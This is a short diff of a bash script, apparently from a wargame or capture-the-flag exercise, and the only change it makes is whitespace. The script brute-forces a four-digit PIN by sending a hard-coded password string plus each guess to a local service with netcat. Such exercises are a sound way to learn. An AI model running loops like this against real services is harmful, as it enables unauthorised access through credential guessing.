@@ -2,7 +2,7 @@
 
 for ((i=1111; i<10000; i++))
 do
-
+ 
 echo "---try" $i "---"
 echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $i | nc localhost 30002 &
 
